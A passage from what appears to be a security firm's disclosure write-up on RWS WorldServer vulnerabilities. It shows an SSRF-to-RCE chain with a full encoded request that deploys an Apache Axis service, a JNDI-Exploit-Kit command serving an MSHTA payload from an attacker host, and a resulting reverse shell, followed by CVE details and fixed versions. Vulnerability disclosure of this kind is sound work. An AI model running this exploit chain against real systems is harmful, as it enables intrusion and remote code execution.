<p><span data-contrast="auto">The relevant WorldServer code is as follows:</span><span data-ccp-props="{&quot;134245417&quot;:false,&quot;201341983&quot;:0,&quot;335551550&quot;:1,&quot;335551620&quot;:1,&quot;335559685&quot;:119,&quot;335559737&quot;:0,&quot;335559738&quot;:114,&quot;335559739&quot;:0,&quot;335559740&quot;:240}">&nbsp;</span></p>
<pre id="650c504a-e5a9-4a8e-8a7d-8dac04815568"><code>public class LoadDTD extends WSHttpServlet {<br>  public void handle(PageContext pc) throws IOException, StorageException, CompleteTransactionException {<br>    String idDecl;<br>    XHiveResolver.initializeResolver(pc.getWSContext());<br>    String publicID = pc.getParameter("public_id");<br>    String systemID = pc.getParameter("system_id");<br>    if (publicID != null) {<br>      idDecl = "PUBLIC '" + publicID + "' '" + ((systemID == null) ? "'" : (systemID + "'"));<br>    } else {<br>      idDecl = "SYSTEM '" + ((systemID == null) ? "'" : (systemID + "'"));<br>    } <br>    String doc = "&lt;?xml version='1.0' encoding='UTF-8' standalone='no'?&gt;\n&lt;!DOCTYPE foo " + idDecl + "&gt;\n&lt;foo/&gt;";<br>    HttpServletResponse response = pc.getResponse();<br>    response.setContentType("text/dtd;charset=UTF-8");<br>    try {<br>      SAXParser sAXParser = new SAXParser();<br>      XHiveResolver.installResolver((XMLReader)sAXParser);<br>      sAXParser.setProperty("http://xml.org/sax/properties/declaration-handler", new DTDDumper(pc<br>            .getResponse().getWriter()));<br>      sAXParser.parse(new InputSource(new StringReader(doc)));<br>    } catch (Exception e) {<br>      Log log = Configuration.getLog();<br>      log.log(2, 3, "DTD generation error", e);<br>    } <br>    response.getWriter().close();<br>  }<br>}</code></pre>
<p><span data-contrast="auto">We can turn this into RCE by deploying a new Apache Axis service and making use of the LogHandler class to deploy a webshell, or we can use a more exotic technique using a JNDI lookup with the org.apache.axis.client.ServiceFactory class. The original write-up for the JNDI technique was found at </span><a href="https://www.cnblogs.com/nice0e3/p/15605781.html"><span data-contrast="auto">htt</span><span data-contrast="auto">p</span><span data-contrast="auto">s://www.cnblogs.com/nice0e3/p/15605781.html</span></a><span data-contrast="auto">.</span><span data-ccp-props="{&quot;134245417&quot;:false,&quot;201341983&quot;:0,&quot;335551550&quot;:1,&quot;335551620&quot;:1,&quot;335559685&quot;:119,&quot;335559737&quot;:126,&quot;335559738&quot;:222,&quot;335559739&quot;:0,&quot;335559740&quot;:314}">&nbsp;</span></p>
<p><span data-contrast="auto">To confirm the SSRF, we use Burp to send the following request:</span><span data-ccp-props="{&quot;134245417&quot;:false,&quot;201341983&quot;:0,&quot;335551550&quot;:1,&quot;335551620&quot;:1,&quot;335559685&quot;:119,&quot;335559737&quot;:0,&quot;335559738&quot;:113,&quot;335559739&quot;:0,&quot;335559740&quot;:240}">&nbsp;</span></p>
<p><span data-ccp-props="{&quot;134245417&quot;:false,&quot;201341983&quot;:0,&quot;335551550&quot;:1,&quot;335551620&quot;:1,&quot;335559685&quot;:119,&quot;335559737&quot;:0,&quot;335559738&quot;:113,&quot;335559739&quot;:0,&quot;335559740&quot;:240}"><img src="https://www.triskelelabs.com/hs-fs/hubfs/31.png?width=927&amp;height=362&amp;name=31.png" width="927" height="362" loading="lazy" alt="31" style="height: auto; max-width: 100%; width: 927px;" srcset="https://www.triskelelabs.com/hs-fs/hubfs/31.png?width=464&amp;height=181&amp;name=31.png 464w, https://www.triskelelabs.com/hs-fs/hubfs/31.png?width=927&amp;height=362&amp;name=31.png 927w, https://www.triskelelabs.com/hs-fs/hubfs/31.png?width=1391&amp;height=543&amp;name=31.png 1391w, https://www.triskelelabs.com/hs-fs/hubfs/31.png?width=1854&amp;height=724&amp;name=31.png 1854w, https://www.triskelelabs.com/hs-fs/hubfs/31.png?width=2318&amp;height=905&amp;name=31.png 2318w, https://www.triskelelabs.com/hs-fs/hubfs/31.png?width=2781&amp;height=1086&amp;name=31.png 2781w" sizes="(max-width: 927px) 100vw, 927px"></span></p>
<p><span data-contrast="auto" xml:lang="EN-US" lang="EN-US"><span data-ccp-parastyle="Body Text">Resulting</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">in the HTTP request to our Burp Collaborator </span><span data-ccp-parastyle="Body Text">instance:</span></span><span data-ccp-props="{&quot;134245417&quot;:false,&quot;201341983&quot;:0,&quot;335551550&quot;:1,&quot;335551620&quot;:1,&quot;335559685&quot;:120,&quot;335559737&quot;:0,&quot;335559738&quot;:93,&quot;335559739&quot;:0,&quot;335559740&quot;:240}">&nbsp;</span></p>
<p><img src="https://www.triskelelabs.com/hs-fs/hubfs/32.png?width=692&amp;height=269&amp;name=32.png" width="692" height="269" loading="lazy" alt="32" style="height: auto; max-width: 100%; width: 692px;" srcset="https://www.triskelelabs.com/hs-fs/hubfs/32.png?width=346&amp;height=135&amp;name=32.png 346w, https://www.triskelelabs.com/hs-fs/hubfs/32.png?width=692&amp;height=269&amp;name=32.png 692w, https://www.triskelelabs.com/hs-fs/hubfs/32.png?width=1038&amp;height=404&amp;name=32.png 1038w, https://www.triskelelabs.com/hs-fs/hubfs/32.png?width=1384&amp;height=538&amp;name=32.png 1384w, https://www.triskelelabs.com/hs-fs/hubfs/32.png?width=1730&amp;height=673&amp;name=32.png 1730w, https://www.triskelelabs.com/hs-fs/hubfs/32.png?width=2076&amp;height=807&amp;name=32.png 2076w" sizes="(max-width: 692px) 100vw, 692px"></p>
<p><span data-contrast="auto" xml:lang="EN-US" lang="EN-US"><span data-ccp-parastyle="Body Text">To</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">deploy</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">our</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">new</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">Apache</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">Axis</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">service,</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">we</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">need</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">to</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">send</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">a</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">GET</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">request</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">to</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">/</span><span data-ccp-parastyle="Body Text">ws</span><span data-ccp-parastyle="Body Text">- legacy/services/</span><span data-ccp-parastyle="Body Text">AdminService</span><span data-ccp-parastyle="Body Text"> on the loopback address of the host running </span><span data-ccp-parastyle="Body Text">WorldServer</span><span data-ccp-parastyle="Body Text">, with the proper URL encoding:</span></span><span data-ccp-props="{&quot;134245417&quot;:false,&quot;201341983&quot;:0,&quot;335551550&quot;:1,&quot;335551620&quot;:1,&quot;335559685&quot;:119,&quot;335559737&quot;:153,&quot;335559738&quot;:93,&quot;335559739&quot;:0,&quot;335559740&quot;:314}">&nbsp;</span></p>
<p><code><span data-ccp-props="{&quot;134245417&quot;:false,&quot;201341983&quot;:0,&quot;335551550&quot;:1,&quot;335551620&quot;:1,&quot;335559685&quot;:119,&quot;335559737&quot;:153,&quot;335559738&quot;:93,&quot;335559739&quot;:0,&quot;335559740&quot;:314}">http://10.0.0.142:8080/ws-legacy/load_dtd?system_id=http%3a//127.0.0.1%3a8080/ws-legacy/services/AdminService%3fmethod%3d!--%253E%253Cdeployment%2520xmlns%253D%2522http%253A%252F%252Fxml.apache.org%252Faxis%252Fwsdd%252F%2522%2520xmlns%253Ajava%253D%2522http%253A%252F%252Fxml.apache.org%252Faxis%252Fwsdd%252Fproviders%252Fjava%2522%253E%253Cservice%2520name%253D%2522ServiceFactoryService%2522%2520provider%253D%2522java%253ARPC%2522%253E%253Cparameter%2520name%253D%2522className%2522%2520value%253D%2522org.apache.axis.client.ServiceFactory%2522%252F%253E%253Cparameter%2520name%253D%2522allowedMethods%2522%2520value%253D%2522*%2522%252F%253E%253C%252Fservice%253E%253C%252Fdeployment&amp;token=900648455</span></code></p>
<p><span data-contrast="auto" xml:lang="EN-US" lang="EN-US"><span data-ccp-parastyle="Body Text">This results in our new service being </span><span data-ccp-parastyle="Body Text">created:</span></span><span data-ccp-props="{&quot;134245417&quot;:false,&quot;201341983&quot;:0,&quot;335551550&quot;:1,&quot;335551620&quot;:1,&quot;335559685&quot;:120,&quot;335559737&quot;:0,&quot;335559738&quot;:93,&quot;335559739&quot;:0,&quot;335559740&quot;:240}">&nbsp;</span></p>
<p><span data-ccp-props="{&quot;134245417&quot;:false,&quot;201341983&quot;:0,&quot;335551550&quot;:1,&quot;335551620&quot;:1,&quot;335559685&quot;:120,&quot;335559737&quot;:0,&quot;335559738&quot;:93,&quot;335559739&quot;:0,&quot;335559740&quot;:240}"><img src="https://www.triskelelabs.com/hs-fs/hubfs/34.png?width=494&amp;height=322&amp;name=34.png" width="494" height="322" loading="lazy" alt="34" style="height: auto; max-width: 100%; width: 494px;" srcset="https://www.triskelelabs.com/hs-fs/hubfs/34.png?width=247&amp;height=161&amp;name=34.png 247w, https://www.triskelelabs.com/hs-fs/hubfs/34.png?width=494&amp;height=322&amp;name=34.png 494w, https://www.triskelelabs.com/hs-fs/hubfs/34.png?width=741&amp;height=483&amp;name=34.png 741w, https://www.triskelelabs.com/hs-fs/hubfs/34.png?width=988&amp;height=644&amp;name=34.png 988w, https://www.triskelelabs.com/hs-fs/hubfs/34.png?width=1235&amp;height=805&amp;name=34.png 1235w, https://www.triskelelabs.com/hs-fs/hubfs/34.png?width=1482&amp;height=966&amp;name=34.png 1482w" sizes="(max-width: 494px) 100vw, 494px"></span></p>
<p><span data-contrast="auto">All that’s left is to call the service with the jndiName pointing to our rogue LDAP server. For this, we chose to use the excellent</span><a href="https://github.com/pimps/JNDI-Exploit-Kit"><span data-contrast="auto"> </span><span data-contrast="auto">htt</span><span data-contrast="auto">p</span><span data-contrast="auto">s://github.com/pimps/JNDI-</span><span data-contrast="auto"> </span><span data-contrast="auto">Ex</span><span data-contrast="auto">p</span><span data-contrast="auto">loit-Kit</span></a><span data-contrast="auto"> and served up another MSHTA payload, though any other Window</span><span data-contrast="auto">s command would work, including PowerShell one-liners or stagers. </span></p>
<p><span data-contrast="auto">Apart from the lack of having to write a webshell to the disk, which is an added benefit, this method of exploiting an Apache Axis SSRF also avoids the need to ensure your webshell is reachable or in the correct parent directory.</span><span data-ccp-props="{&quot;134245417&quot;:false,&quot;201341983&quot;:0,&quot;335551550&quot;:1,&quot;335551620&quot;:1,&quot;335559685&quot;:119,&quot;335559737&quot;:247,&quot;335559738&quot;:92,&quot;335559739&quot;:0,&quot;335559740&quot;:314}">&nbsp;</span></p>
<p><span data-contrast="auto">We spin up the LDAP server:</span><span data-ccp-props="{&quot;134245417&quot;:false,&quot;201341983&quot;:0,&quot;335551550&quot;:1,&quot;335551620&quot;:1,&quot;335559685&quot;:119,&quot;335559737&quot;:0,&quot;335559738&quot;:111,&quot;335559739&quot;:0,&quot;335559740&quot;:240}">&nbsp;</span></p>
<pre id="25a07c37-c9ee-449c-a85c-355107094dea"><code>java -jar JNDI-Exploit-Kit-1.0-SNAPSHOT-all.jar -C 'mshta http://10.0.0.131:8080/0iuSimsjJ1Z2451.hta'</code></pre>
<p><span data-contrast="auto">And send our request in Burp, swapping the<span style="color: #4f4f4f;"> <span style="background-color: #f5f5f5;">xsd : anyType</span></span> for <span style="color: #4f4f4f; background-color: #f5f5f5;">xsd : string</span> for both the jndiName and value types:&nbsp;</span></p>
<p><span data-contrast="auto"><img src="https://www.triskelelabs.com/hs-fs/hubfs/36.png?width=1009&amp;height=744&amp;name=36.png" width="1009" height="744" loading="lazy" alt="36" style="height: auto; max-width: 100%; width: 1009px;" srcset="https://www.triskelelabs.com/hs-fs/hubfs/36.png?width=505&amp;height=372&amp;name=36.png 505w, https://www.triskelelabs.com/hs-fs/hubfs/36.png?width=1009&amp;height=744&amp;name=36.png 1009w, https://www.triskelelabs.com/hs-fs/hubfs/36.png?width=1514&amp;height=1116&amp;name=36.png 1514w, https://www.triskelelabs.com/hs-fs/hubfs/36.png?width=2018&amp;height=1488&amp;name=36.png 2018w, https://www.triskelelabs.com/hs-fs/hubfs/36.png?width=2523&amp;height=1860&amp;name=36.png 2523w, https://www.triskelelabs.com/hs-fs/hubfs/36.png?width=3027&amp;height=2232&amp;name=36.png 3027w" sizes="(max-width: 1009px) 100vw, 1009px"></span></p>
<p><span data-contrast="auto"><span data-contrast="auto" xml:lang="EN-US" lang="EN-US">We confirm we receive a successful lookup to our LDAP server and our payload is requested and served correctly:</span>&nbsp;</span></p>
<p><span data-contrast="auto"><img src="https://www.triskelelabs.com/hs-fs/hubfs/37.png?width=960&amp;height=111&amp;name=37.png" width="960" height="111" loading="lazy" alt="37" style="height: auto; max-width: 100%; width: 960px;" srcset="https://www.triskelelabs.com/hs-fs/hubfs/37.png?width=480&amp;height=56&amp;name=37.png 480w, https://www.triskelelabs.com/hs-fs/hubfs/37.png?width=960&amp;height=111&amp;name=37.png 960w, https://www.triskelelabs.com/hs-fs/hubfs/37.png?width=1440&amp;height=167&amp;name=37.png 1440w, https://www.triskelelabs.com/hs-fs/hubfs/37.png?width=1920&amp;height=222&amp;name=37.png 1920w, https://www.triskelelabs.com/hs-fs/hubfs/37.png?width=2400&amp;height=278&amp;name=37.png 2400w, https://www.triskelelabs.com/hs-fs/hubfs/37.png?width=2880&amp;height=333&amp;name=37.png 2880w" sizes="(max-width: 960px) 100vw, 960px"></span></p>
<p><span data-contrast="auto" xml:lang="EN-US" lang="EN-US"><span data-ccp-parastyle="Body Text">Resulting in a reverse </span><span data-ccp-parastyle="Body Text">shell:</span></span><span data-ccp-props="{&quot;134245417&quot;:false,&quot;201341983&quot;:0,&quot;335551550&quot;:1,&quot;335551620&quot;:1,&quot;335559685&quot;:120,&quot;335559737&quot;:0,&quot;335559738&quot;:93,&quot;335559739&quot;:0,&quot;335559740&quot;:240}">&nbsp;</span></p>
<p><span data-ccp-props="{&quot;134245417&quot;:false,&quot;201341983&quot;:0,&quot;335551550&quot;:1,&quot;335551620&quot;:1,&quot;335559685&quot;:120,&quot;335559737&quot;:0,&quot;335559738&quot;:93,&quot;335559739&quot;:0,&quot;335559740&quot;:240}"><img src="https://www.triskelelabs.com/hs-fs/hubfs/38.png?width=843&amp;height=125&amp;name=38.png" width="843" height="125" loading="lazy" alt="38" style="height: auto; max-width: 100%; width: 843px;" srcset="https://www.triskelelabs.com/hs-fs/hubfs/38.png?width=422&amp;height=63&amp;name=38.png 422w, https://www.triskelelabs.com/hs-fs/hubfs/38.png?width=843&amp;height=125&amp;name=38.png 843w, https://www.triskelelabs.com/hs-fs/hubfs/38.png?width=1265&amp;height=188&amp;name=38.png 1265w, https://www.triskelelabs.com/hs-fs/hubfs/38.png?width=1686&amp;height=250&amp;name=38.png 1686w, https://www.triskelelabs.com/hs-fs/hubfs/38.png?width=2108&amp;height=313&amp;name=38.png 2108w, https://www.triskelelabs.com/hs-fs/hubfs/38.png?width=2529&amp;height=375&amp;name=38.png 2529w" sizes="(max-width: 843px) 100vw, 843px"></span></p>
<h3 aria-level="1">&nbsp;</h3>
<h3 aria-level="1"><strong><span data-contrast="auto">Final thoughts</span></strong><span data-ccp-props="{&quot;134245417&quot;:false,&quot;201341983&quot;:0,&quot;335551550&quot;:1,&quot;335551620&quot;:1,&quot;335559685&quot;:120,&quot;335559737&quot;:0,&quot;335559738&quot;:74,&quot;335559739&quot;:0,&quot;335559740&quot;:240}">&nbsp;</span></h3>
<p><span data-contrast="auto">This software, while not extremely widespread, seems to be in use, or has been in use recently, at several major companies, including some of the biggest companies in the world. </span></p>
<p><span data-contrast="auto">It was clear that a thorough security review was never undertaken by the vendor, nor by the companies exposing it on their external perimeter. </span></p>
<p><span data-contrast="auto">Given the amount of recent high-profile intrusions via trivial bugs in 3rd party software, including VPN appliances and load balancers, file transfer appliances, MDM products and more, it is imperative companies perform their due diligence on the software they expose publicly. </span></p>
<p><span data-contrast="auto">Threat actors have cottoned on that 3rd party software seems to be an easy win if they invest the time and effort to get their hands on the software and spend some time looking for weaknesses and as such the threat model has shifted to ensure that you not only stay on top of patching, but perform code reviews and security testing of everything that is exposed.</span><span data-ccp-props="{&quot;134245417&quot;:false,&quot;201341983&quot;:0,&quot;335551550&quot;:1,&quot;335551620&quot;:1,&quot;335559685&quot;:120,&quot;335559737&quot;:141,&quot;335559738&quot;:0,&quot;335559739&quot;:0,&quot;335559740&quot;:314}">&nbsp;</span></p>
<p>&nbsp;</p>
<h3><strong>Vulnerability Details</strong></h3>
<pre data-stringify-type="pre">CVE-2022-34267:<br><br>Product: WorldServer<br>Affected Versions: 11.7.2.243 and earlier versions<br>Fixed Version: 11.7.3<br>Vulnerability Type: Authentication Bypass<br>Security Risk: Critical<br>Vendor URL: <a target="_blank" data-stringify-link="https://www.rws.com/localization/products/additional-solutions/" data-sk="tooltip_parent" href="https://www.rws.com/localization/products/additional-solutions/" rel="noopener noreferrer" delay="150">https://www.rws.com/localization/products/additional-solutions/</a><br>Vendor Status: fixed version released<br>Advisory URL: <a target="_blank" data-stringify-link="https://www.triskelelabs.com/vulnerabilities-in-rws-worldserver" data-sk="tooltip_parent" href="https://www.triskelelabs.com/vulnerabilities-in-rws-worldserver" rel="noopener noreferrer" delay="150">https://www.triskelelabs.com/vulnerabilities-in-rws-worldserver</a><br>Advisory Status: published<br>CVE: CVE-2022-34267 <br>CVE URL: <a target="_blank" data-stringify-link="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-34267" data-sk="tooltip_parent" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-34267" rel="noopener noreferrer" delay="150">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-34267</a><br><br><br>CVE-2022-34268:<br><br>Product: WorldServer<br>Affected Versions: 11.7.2.243 and earlier versions<br>Fixed Version: 11.7.3<br>Vulnerability Type: Insecure Deserialisation<br>Security Risk: Critical<br>Vendor URL: <a target="_blank" data-stringify-link="https://www.rws.com/localization/products/additional-solutions/" data-sk="tooltip_parent" href="https://www.rws.com/localization/products/additional-solutions/" rel="noopener noreferrer" delay="150">https://www.rws.com/localization/products/additional-solutions/</a><br>Vendor Status: fixed version released<br>Advisory URL: <a target="_blank" data-stringify-link="https://www.triskelelabs.com/vulnerabilities-in-rws-worldserver" data-sk="tooltip_parent" href="https://www.triskelelabs.com/vulnerabilities-in-rws-worldserver" rel="noopener noreferrer" delay="150">https://www.triskelelabs.com/vulnerabilities-in-rws-worldserver</a><br>Advisory Status: published<br>CVE: CVE-2022-34268<br>CVE URL: <a target="_blank" data-stringify-link="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-34268" data-sk="tooltip_parent" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-34268" rel="noopener noreferrer" delay="150">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-34268</a><br><br><br>CVE-2022-34270:<br><br>Product: WorldServer<br>Affected Versions: 11.7.2.243 and earlier versions<br>Fixed Version: 11.7.3<br>Vulnerability Type: Privilege Escalation<br>Security Risk: High<br>Vendor URL: <a target="_blank" data-stringify-link="https://www.rws.com/localization/products/additional-solutions/" data-sk="tooltip_parent" href="https://www.rws.com/localization/products/additional-solutions/" rel="noopener noreferrer" delay="150">https://www.rws.com/localization/products/additional-solutions/</a><br>Vendor Status: fixed version released<br>Advisory URL: <a target="_blank" data-stringify-link="https://www.triskelelabs.com/vulnerabilities-in-rws-worldserver" data-sk="tooltip_parent" href="https://www.triskelelabs.com/vulnerabilities-in-rws-worldserver" rel="noopener noreferrer" delay="150">https://www.triskelelabs.com/vulnerabilities-in-rws-worldserver</a><br>Advisory Status: published<br>CVE: CVE-2022-34270<br>CVE URL: <a target="_blank" data-stringify-link="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-34270" data-sk="tooltip_parent" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-34270" rel="noopener noreferrer" delay="150">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-34270</a><br><br><br>CVE-2022-34269:<br><br>Product: WorldServer<br>Affected Versions: 11.7.2.243 and earlier versions<br>Fixed Version: 11.7.3<br>Vulnerability Type: Remote Code Execution<br>Security Risk: High<br>Vendor URL: <a target="_blank" data-stringify-link="https://www.rws.com/localization/products/additional-solutions/" data-sk="tooltip_parent" href="https://www.rws.com/localization/products/additional-solutions/" rel="noopener noreferrer" delay="150">https://www.rws.com/localization/products/additional-solutions/</a><br>Vendor Status: fixed version released<br>Advisory URL: <a target="_blank" data-stringify-link="https://www.triskelelabs.com/vulnerabilities-in-rws-worldserver" data-sk="tooltip_parent" href="https://www.triskelelabs.com/vulnerabilities-in-rws-worldserver" rel="noopener noreferrer" delay="150">https://www.triskelelabs.com/vulnerabilities-in-rws-worldserver</a><br>Advisory Status: published<br>CVE: CVE-2022-34269<br>CVE URL: <a target="_blank" data-stringify-link="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-34269" data-sk="tooltip_parent" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-34269" rel="noopener noreferrer" delay="150">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-34269</a></pre>
<hr>
<p>Brecht is a CREST International Registered Tester (CRT), an Offensive Security Certified Professional (OSCP), an Offensive Security Certified Expert (OSCE) and a GIAC Exploit Researcher and Advanced Penetration Tester (GXPN).</p>
<p>As a keen Windows security researcher, Brecht is particularly interested in the operation system internals and their use in creating and detecting offensive tooling.</p>
<p>In addition to the above, Brecht maintains a strong interest in current Web technologies and vulnerabilities and vulnerability research of embedded devices such as routers, alarm systems and other Internet-of-Things devices.</p>
<hr>
<p>&nbsp;</p></div>
  
</div>

    </div>

    
  </div>
</div>
</div>

</div><!--end widget-span -->
</div><!--end row-->
</div><!--end row-wrapper -->

</div><!--end widget-span -->
</div><!--end row-->
</div><!--end row-wrapper -->

<div class="row-fluid-wrapper row-depth-1 row-number-6 dnd-section">
<div class="row-fluid ">
<div class="span12 widget-span widget-type-cell dnd-column" style="" data-widget-type="cell" data-x="0" data-w="12">

<div class="row-fluid-wrapper row-depth-1 row-number-7 dnd-row">
<div class="row-fluid ">
<div class="span12 widget-span widget-type-custom_widget dnd-module" style="" data-widget-type="custom_widget" data-x="0" data-w="12">
<div id="hs_cos_wrapper_widget_1695965476889" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module" style="" data-hs-cos-general-type="widget" data-hs-cos-type="module">








<div id="" class="gp-block gp-block_paddings-large gp-block_dark gp-block_text-light gp-textForm
              gp-block_submit-tertiary
              gp-textForm_right" style="
      
      
        background-image: url(https://www.triskelelabs.com/hubfs/CTA_BG_Green.png);
        
      ">
  
  
  
  <div class="gp-block__bg gp-block_none">
  </div>
  
  <div class="gp-block__wrapper">
    
<div class="gp-textForm__container">
  <div class="gp-textForm__row gp-textForm__row_top-aligned">
    <div class="gp-textForm__formCol">
      
      <div class="gp-textForm__formWrp gp-textForm__formWrp_none gp-textForm__formWrp_text_light">
        
        
        
        <span id="hs_cos_wrapper_widget_1695965476889_" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_form" style="" data-hs-cos-general-type="widget" data-hs-cos-type="form"><h3 id="hs_cos_wrapper_form_704869553_title" class="hs_cos_wrapper form-title" data-hs-cos-general-type="widget_field" data-hs-cos-type="text"></h3>

<div id="hs_form_target_form_704869553"></div>









</span>
        
      </div>
      
      
      
    </div>
    <div class="gp-textForm__txtCol gp-textForm__rte">
      <p><span style="color: #000000;">Subscribe_</span></p>
<h2>Get the latest Cyber Wonderland in your inbox</h2>
<p>&nbsp;</p>
    </div>
  </div>
</div>

  </div>
</div>
</div>

</div><!--end widget-span -->
</div><!--end row-->
</div><!--end row-wrapper -->

</div><!--end widget-span -->
</div><!--end row-->
</div><!--end row-wrapper -->

</div><!--end widget-span -->
</div>
</div>
</div>
</div><!--end widget-span -->
</div><!--end row-->
</div><!--end row-wrapper -->

    </div><!--end body -->
</div><!--end body wrapper -->

<div class="footer-container-wrapper">
    <div class="footer-container container-fluid">

<div class="row-fluid-wrapper row-depth-1 row-number-1 ">
<div class="row-fluid ">
<div class="span12 widget-span widget-type-custom_widget " style="" data-widget-type="custom_widget" data-x="0" data-w="12">
<div id="hs_cos_wrapper_module_16058581896751091" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module" style="" data-hs-cos-general-type="widget" data-hs-cos-type="module">





<footer class="gp-footer gp-footer_dark">
  <div class="gp-footer__container">
    <div class="gp-footer__row">
      <div class="gp-footer__col">
        <div class="gp-footer__info">
          <div class="gp-footer__logo-cont">
            <img class="gp-footer__logo" src="https://www.triskelelabs.com/hubfs/TL%20Mark%20White.svg" alt="TL Mark White">
          </div>
          <div class="gp-footer__texts gp-footer__texts_light">
            <p class="gp-footer__text">Copyright ©2024</p>
            
            
            
            
            
            <a href="https://www.triskelelabs.com/privacy-policy?hsLang=en" class="gp-footer__link">Privacy Policy</a>
            
            
            <span class="gp-footer__divider"> | </span>
            
            
            <a href="https://www.triskelelabs.com/terms-of-use?hsLang=en" class="gp-footer__link">Terms</a>
            
            
            
          </div>
        </div>
        <div class="gp-footer__social">
          
          
          
          <a href="https://twitter.com/triskelelabs?lang=en" class="gp-footer__link gp-footer__link_social gp-footer__link_tw" target="_blank"></a>
          
          
          
          <a href="https://www.youtube.com/channel/UCarMWBeh4qbdetlcA3e0aaA" class="gp-footer__link gp-footer__link_social gp-footer__link_yo" target="_blank"></a>
          
          
          
          <a href="https://www.linkedin.com/company/triskele-labs" class="gp-footer__link gp-footer__link_social gp-footer__link_li" target="_blank"></a>
          
        </div>
      </div>
    </div>
  </div>
</footer>
</div>

</div><!--end widget-span -->
</div><!--end row-->
</div><!--end row-wrapper -->

    </div><!--end footer -->
</div><!--end footer wrapper -->

    
<!-- HubSpot performance collection script -->
<script defer src="/hs/hsstatic/content-cwv-embed/static-1.1293/embed.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
<script>
var hsVars = hsVars || {}; hsVars['language'] = 'en';
</script>

<script src="/hs/hsstatic/cos-i18n/static-1.53/bundles/project.js"></script>
<script src="https://www.triskelelabs.com/hs-fs/hub/19911083/hub_generated/template_assets/52806009188/1708536350090/triskele_labs_theme_2021/assets/bundle.min.js"></script>
<script src="https://www.triskelelabs.com/hs-fs/hub/19911083/hub_generated/template_assets/52806009187/1656929870099/triskele_labs_theme_2021/assets/anime.min.js"></script>

    <!--[if lte IE 8]>
    <script charset="utf-8" src="https://js.hsforms.net/forms/v2-legacy.js"></script>
    <![endif]-->

<script data-hs-allowed="true" src="/_hcms/forms/v2.js"></script>

    <script data-hs-allowed="true">
        var options = {
            portalId: '19911083',
            formId: 'dc0bcc7f-e678-4129-8d05-7be92c7c6571',
            formInstanceId: '5246',
            
            pageId: '136727297055',
            
            region: 'na1',
            
            
            
            
            pageName: "Cyber Wonderland Vulnerabilities in RWS WorldServer ",
            
            
            
            inlineMessage: "Thanks for submitting the form.",
            
            
            rawInlineMessage: "Thanks for submitting the form.",
            
            
            hsFormKey: "a76c93413e404b120f7b977dfc87234a",
            
            
            css: '',
            target: '#hs_form_target_form_704869553',
            
            
            
            
            
            
            
            contentType: "standard-page",
            
            
            
            formsBaseUrl: '/_hcms/forms/',
            
            
            
            formData: {
                cssClass: 'hs-form stacked hs-custom-form'
            }
        };

        options.getExtraMetaDataBeforeSubmit = function() {
            var metadata = {};
            

            if (hbspt.targetedContentMetadata) {
                var count = hbspt.targetedContentMetadata.length;
                var targetedContentData = [];
                for (var i = 0; i < count; i++) {
                    var tc = hbspt.targetedContentMetadata[i];
                     if ( tc.length !== 3) {
                        continue;
                     }
                     targetedContentData.push({
                        definitionId: tc[0],
                        criterionId: tc[1],
                        smartTypeId: tc[2]
                     });
                }
                metadata["targetedContentMetadata"] = JSON.stringify(targetedContentData);
            }

            return metadata;
        };

        hbspt.forms.create(options);
    </script>


<!-- Start of HubSpot Analytics Code -->
<script type="text/javascript">
var _hsq = _hsq || [];
_hsq.push(["setContentType", "standard-page"]);
_hsq.push(["setCanonicalUrl", "https:\/\/www.triskelelabs.com\/vulnerabilities-in-rws-worldserver"]);
_hsq.push(["setPageId", "136727297055"]);
_hsq.push(["setContentMetadata", {
    "contentPageId": 136727297055,
    "legacyPageId": "136727297055",
    "contentFolderId": null,
    "contentGroupId": null,
    "abTestId": null,
    "languageVariantId": 136727297055,
    "languageCode": "en",
    
    
}]);
</script>

<script type="text/javascript" id="hs-script-loader" async defer src="/hs/scriptloader/19911083.js"></script>
<!-- End of HubSpot Analytics Code -->


<script type="text/javascript">
var hsVars = {
    render_id: "6594b844-05aa-48b3-8609-afbe5c211f9a",
    ticks: 1736614642190,
    page_id: 136727297055,
    
    content_group_id: 0,
    portal_id: 19911083,
    app_hs_base_url: "https://app.hubspot.com",
    cp_hs_base_url: "https://cp.hubspot.com",
    language: "en",
    analytics_page_type: "standard-page",
    scp_content_type: "",
    analytics_page_id: "136727297055",
    category_id: 1,
    folder_id: 0,
    is_hubspot_user: false
}
</script>


